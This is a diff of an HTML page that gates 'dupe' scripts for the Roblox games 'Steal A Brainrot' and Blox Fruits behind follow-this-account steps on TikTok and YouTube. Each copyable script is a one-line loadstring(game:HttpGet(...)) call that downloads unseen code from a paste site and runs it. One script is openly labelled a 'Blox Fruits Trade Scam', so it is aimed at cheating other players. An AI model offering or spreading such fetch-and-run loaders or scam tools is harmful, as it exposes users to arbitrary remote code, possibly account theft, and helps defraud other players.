@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Unlock Dupe</title>
 
 <style>
@@ -141,7 +141,7 @@ textarea {
 <body>
 
 <div class="card">
-  <div class="title">🔑 Steal A Brainrot Dupe</div>
+  <div class="title" id="pageTitle">🔑 Steal A Brainrot Dupe</div>
   <div class="subtitle">Complete all steps to unlock</div>
 
   <button class="task tiktok" onclick="step(this,'https://www.tiktok.com/@void_scriptz?_r=1&_t=ZT-92Rd5Rtlw3K')">📌 Follow TikTok</button>
@@ -166,19 +166,19 @@ textarea {
     <div class="script-box">
       <div class="script-title">Dupe Script 1</div>
       <textarea readonly>loadstring(game:HttpGet("https://dpaste.com/ELB5KB66F.txt", true))()</textarea>
-      <button class="copy" onclick="copy(this.previousElementSibling.value)">Copy</button>
+      <button class="copy" onclick="copyWithConfirm(this.previousElementSibling.value)">Copy</button>
     </div>
 
     <div class="script-box">
       <div class="script-title">Dupe Script 2</div>
       <textarea readonly>loadstring(game:HttpGet("https://pastefy.app/qLQ25me5/raw"))()</textarea>
-      <button class="copy" onclick="copy(this.previousElementSibling.value)">Copy</button>
+      <button class="copy" onclick="copyWithConfirm(this.previousElementSibling.value)">Copy</button>
     </div>
 
     <div class="script-box">
       <div class="script-title">Dupe Script 3</div>
       <textarea readonly>loadstring(game:HttpGet("https://pastefy.app/cX73Mb9d/raw"))()</textarea>
-      <button class="copy" onclick="copy(this.previousElementSibling.value)">Copy</button>
+      <button class="copy" onclick="copyWithConfirm(this.previousElementSibling.value)">Copy</button>
     </div>
   </div>
 
@@ -192,25 +192,25 @@ textarea {
     <div class="script-box">
       <div class="script-title">Dupe Script 1</div>
       <textarea readonly>loadstring(game:HttpGet("https://dpaste.com/ELB5KB66F.txt", true))()</textarea>
-      <button class="copy" onclick="copy(this.previousElementSibling.value)">Copy</button>
+      <button class="copy" onclick="copyWithConfirm(this.previousElementSibling.value)">Copy</button>
     </div>
 
     <div class="script-box">
       <div class="script-title">Dupe Script 2</div>
       <textarea readonly>loadstring(game:HttpGet("https://pastefy.app/qLQ25me5/raw"))()</textarea>
-      <button class="copy" onclick="copy(this.previousElementSibling.value)">Copy</button>
+      <button class="copy" onclick="copyWithConfirm(this.previousElementSibling.value)">Copy</button>
     </div>
 
     <div class="script-box">
       <div class="script-title">Dupe Script 3</div>
       <textarea readonly>loadstring(game:HttpGet("https://pastefy.app/cX73Mb9d/raw"))()</textarea>
-      <button class="copy" onclick="copy(this.previousElementSibling.value)">Copy</button>
+      <button class="copy" onclick="copyWithConfirm(this.previousElementSibling.value)">Copy</button>
     </div>
 
     <div class="script-box">
       <div class="script-title">Blox Fruits Trade Scam</div>
-      <textarea readonly>loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/tdmn5CXvSCxTbnip/raw", true))()</textarea>
-      <button class="copy" onclick="copy(this.previousElementSibling.value)">Copy</button>
+      <textarea readonly>loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/xU2oTZng4Oga2rmU/raw", true))()</textarea>
+      <button class="copy" onclick="copyWithConfirm(this.previousElementSibling.value)">Copy</button>
     </div>
   </div>
 </div>
@@ -219,6 +219,14 @@ textarea {
 let done = 0;
 const total = 5;
 let ytLink = "https://youtu.be/Oc9vLLmABqs";
+const pageTitle = document.getElementById("pageTitle");
+const toggleBtn = document.getElementById("toggleBtn");
+const bar = document.getElementById("bar");
+const percentEl = document.getElementById("percent");
+const scripts = document.getElementById("scripts");
+const devPanel = document.getElementById("devPanel");
+
+let tradePage = false;
 
 function step(btn, link) {
   if (btn.dataset.done) return;
@@ -237,8 +245,17 @@ function update() {
 }
 
 function togglePage() {
+  tradePage = !tradePage;
   resetProgress();
-  ytLink = "https://youtube.com/shorts/ycfxxkTQmTU?si=MlKbm2fgg7uHEx0M";
+  if (tradePage) {
+    pageTitle.innerText = "🔑 Blox Fruits Trade Scam";
+    toggleBtn.innerText = "⬅ Go Back";
+    ytLink = "https://youtube.com/shorts/ycfxxkTQmTU?si=MlKbm2fgg7uHEx0M";
+  } else {
+    pageTitle.innerText = "🔑 Steal A Brainrot Dupe";
+    toggleBtn.innerText = "Blox Fruits Trade Scam";
+    ytLink = "https://youtu.be/Oc9vLLmABqs";
+  }
 }
 
 function resetProgress() {
@@ -261,9 +278,11 @@ function closeDev() {
   devPanel.style.display = "none";
 }
 
-function copy(text) {
-  navigator.clipboard.writeText(text);
-  alert("Copied!");
+function copyWithConfirm(text) {
+  if (confirm("Use The Script In Second Sea Cafe Or It Won't Work")) {
+    navigator.clipboard.writeText(text);
+    alert("Copied!");
+  }
 }
 </script>
 
